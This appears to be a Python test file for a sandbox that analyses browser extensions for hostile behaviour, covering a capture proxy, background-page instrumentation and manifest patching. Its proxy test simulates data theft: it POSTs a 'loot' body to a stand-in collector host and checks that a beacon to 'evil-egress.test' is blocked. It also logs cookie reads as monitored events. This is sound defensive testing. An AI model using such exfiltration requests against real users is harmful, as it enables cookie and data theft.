"""Tests for the Firefox behavioural engine's browser-independent parts.

The Selenium/Firefox launch itself needs a real browser (exercised by
experiments/firefox_spike.py), but the proxy, the instrumentation of MV2 background pages,
and the capture manifest patch are all plain code and are tested here without a browser.
"""

from __future__ import annotations

import json
import tempfile
import unittest
import urllib.request
from pathlib import Path

from engine.sandbox.proxy import CaptureProxy
from engine.sandbox.rewrite import instrument_extension


def _opener(port: int):
    return urllib.request.build_opener(urllib.request.ProxyHandler({"http": f"127.0.0.1:{port}"}))


class TestCaptureProxy(unittest.TestCase):
    def test_serves_testsite_absorbs_reports_and_seals_egress(self):
        with CaptureProxy() as px:
            op = _opener(px.port)
            # deterministic testsite content
            body = op.open("http://demo-bank.test/login", timeout=5).read().decode()
            self.assertIn("Demo Bank", body)
            # report absorption on every channel the prelude uses
            for ch, ev in [("network", {"url": "https://x.test/i", "method": "POST", "body_len": 9}),
                           ("dom", {"event": "read", "target": "document.cookie"}),
                           ("storage", {"api": "chrome.cookies.getAll"}),
                           ("api", {"api": "chrome.tabs.query"})]:
                payload = json.dumps({"channel": ch, "ts": 0.1, **ev}).encode()
                op.open(urllib.request.Request("http://extdrift-report.invalid/e", data=payload), timeout=5).read()
            self.assertEqual(len(px.channels["network"]), 1)
            self.assertEqual(len(px.channels["dom"]), 1)
            self.assertEqual(px.channels["network"][0]["body_len"], 9)
            # collector ground truth
            op.open(urllib.request.Request("http://collect-metrics.test/i", data=b"loot"), timeout=5).read()
            self.assertEqual(px.collected[0]["host"], "collect-metrics.test")
            # egress control: an unknown host is blackholed, not delivered
            resp = op.open("http://evil-egress.test/beacon", timeout=5)
            self.assertEqual(resp.status, 204)
            self.assertTrue(any(b["host"] == "evil-egress.test" for b in px.blocked))


class TestBackgroundPageInstrumentation(unittest.TestCase):
    def test_mv2_background_page_scripts_get_instrumented(self):
        with tempfile.TemporaryDirectory() as tmp:
            ext = Path(tmp) / "ext"
            ext.mkdir()
            (ext / "manifest.json").write_text(json.dumps({
                "manifest_version": 2, "name": "Bg", "version": "1.0",
                "background": {"page": "bg/back.html"},
            }))
            (ext / "bg").mkdir()
            (ext / "bg" / "back.html").write_text(
                '<html><head><script src="worker.js"></script></head></html>')
            (ext / "bg" / "worker.js").write_text("console.log('bg');")
            r = instrument_extension(ext, Path(tmp) / "work")
            self.assertIn("bg/worker.js", r["instrumented_scripts"])
            injected = (Path(r["path"]) / "bg" / "worker.js").read_text(encoding="utf-8")
            self.assertIn("__extdriftInstalled", injected)


class TestCaptureManifestPatch(unittest.TestCase):
    def _patch(self, manifest):
        from engine.sandbox.firefox_capture import _patch_manifest_for_capture
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "manifest.json").write_text(json.dumps(manifest))
            return _patch_manifest_for_capture(Path(tmp))

    def test_mv2_gets_report_host_in_permissions(self):
        out = self._patch({"manifest_version": 2, "name": "x", "version": "1",
                            "permissions": ["storage"]})
        self.assertTrue(any("extdrift-report.invalid" in p for p in out["permissions"]))
        self.assertIn("storage", out["permissions"])

    def test_mv3_gets_report_host_in_host_permissions(self):
        out = self._patch({"manifest_version": 3, "name": "x", "version": "1"})
        self.assertTrue(any("extdrift-report.invalid" in p for p in out["host_permissions"]))


if __name__ == "__main__":
    unittest.main()
